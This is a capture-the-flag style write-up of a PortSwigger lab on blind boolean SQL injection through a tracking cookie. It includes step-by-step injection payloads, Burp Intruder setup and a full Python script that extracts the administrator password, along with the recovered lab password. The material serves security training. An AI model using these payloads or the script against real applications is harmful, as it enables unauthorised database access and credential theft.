
# #PortSwigger 


![[Pasted image 20251212231232.png]]


## Lab Description

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics and performs a SQL query containing the value of the submitted cookie. The results are not returned, and no error messages are displayed. However, the application includes a "Welcome back" message if the query returns any rows.

**Objective:** Exploit the blind SQL injection vulnerability to find the password of the administrator user, then log in.

**Hint:** The password contains only lowercase alphanumeric characters.

---
----


### Step 1: Capture the Request

1. Visit the front page of the shop
2. In Burp Proxy, find the request containing the `TrackingId` cookie
3. Send it to Repeater

**Example request:**
```
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: TrackingId=dK3rgvEMlHmFaOiz; session=...
```


![[Pasted image 20251212231526.png]]


![[Pasted image 20251212231637.png]]

---

### Step 2: Confirm Injection

**True condition:**
```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND '1'='1'-- -
```

- "Welcome back" message appears --> Condition is true
**Conclusion:** Boolean blind injection works.

![[Pasted image 20251212232516.png]]


---

### Step 3: Verify Users Table Exists

```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND (SELECT 'a' FROM users LIMIT 1)='a'-- -
```

- "Welcome back" appears --> `users` table exists


![[Pasted image 20251212233018.png]]


```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND (SELECT 'a' FROM users LIMIT 1)='a'-- -
```
![[Pasted image 20251212233111.png]]


---

### Step 4: Verify Administrator Use and Determine Password Length

```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'-- -
```

"Welcome back" appears → Password > 1 character

**Conclusion:** Password length = **20 characters**

![[Pasted image 20251212233324.png]]


---


```
Cookie: TrackingId=dK3rgvEMlHmFaOiz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a'-- -
```

### Step 6: Extract Password with Intruder

**Payload setup:**
```
TrackingId=dK3rgvEMlHmFaOiz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§'-- -
```

**Attack type:** Sniper

**Payloads:**

|Type|Values|
|---|---|
|Simple list|a-z, 0-9|

**Grep-Match setup:**

- Add `Welcome back` to the Grep-Match list

![[Pasted image 20251212234014.png]]


---

### Step 7: Python Script Alternative

![[Pasted image 20251213002537.png]]



```
import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
URL = "https://0a7000dc042b87a080c67b7300b50076.web-security-academy.net/"
COOKIE_TRACKING_BASE = "dK3rgvEMlHmFaOiz"
COOKIE_SESSION = "HAgg2HcVZqaHHh4LJISMWpSdT3nRND8G"
INDICATOR = "Welcome back"
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
MAX_LEN = 30
THREADS = 10
DELAY = 0.05
TIMEOUT = 10
HEADERS = {
    "Host": "0a7000dc042b87a080c67b7300b50076.web-security-academy.net",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Te": "trailers"
}
session = requests.Session()
session.headers.update({"User-Agent": HEADERS["User-Agent"]})
session.verify = True
def send_with_payload(payload):
    cookies = {
        "TrackingId": COOKIE_TRACKING_BASE + payload,
        "session": COOKIE_SESSION
    }
    try:
        r = session.get(URL, cookies=cookies, timeout=TIMEOUT)
        return INDICATOR in r.text
    except requests.RequestException:
        return False
def length_gt(n):
    payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > {n}) = 'a'--"
    ok = send_with_payload(payload)
    if DELAY:
        time.sleep(DELAY)
    return ok
def char_at_equals(pos, ch):
    payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator') = '{ch}'--"
    ok = send_with_payload(payload)
    if DELAY:
        time.sleep(DELAY)
    return ok
def discover_length(max_len=MAX_LEN):
    lo = 0
    hi = max_len
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if length_gt(mid):
            lo = mid
        else:
            hi = mid - 1
    discovered = lo + 1
    if discovered <= max_len:
        return discovered
    return None
def extract_password(length, charset=CHARSET, threads=THREADS):
    password = ["?"] * length
    for pos in range(1, length + 1):
        found_char = None
        def check_char(ch):
            try:
                return ch if char_at_equals(pos, ch) else None
            except Exception:
                return None
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(check_char, ch): ch for ch in charset}
            for fut in as_completed(futures):
                result = fut.result()
                if result:
                    found_char = result
                    break
        if found_char is None:
            print(f"[!] Could not find character for position {pos}", file=sys.stderr)
            break
        password[pos - 1] = found_char
        print(f"[+] Found pos {pos}: {found_char} -> {''.join(password)}")
    return "".join(password)
def main():
    print("[*] Discovering password length...")
    length = discover_length()
    if not length or length == 0:
        print("[!] Could not determine password length", file=sys.stderr)
        sys.exit(1)
    print(f"[+] Discovered password length: {length}")
    print("[*] Extracting password...")
    pwd = extract_password(length)
    print("\n=== RESULT ===")
    print(f"Password (length {length}): {pwd}")
if __name__ == "__main__":
    main()
```


---

### Step 8: Log In as Administrator

1. Go to the login page
2. Username: `administrator`
3. Password: `ls07nq8h3mp4of9jzkdw`
4. Click **Log in**


![[Pasted image 20251213002606.png]]


---

### Step 9: Lab Solved

![[Pasted image 20251213002621.png]]


---
---

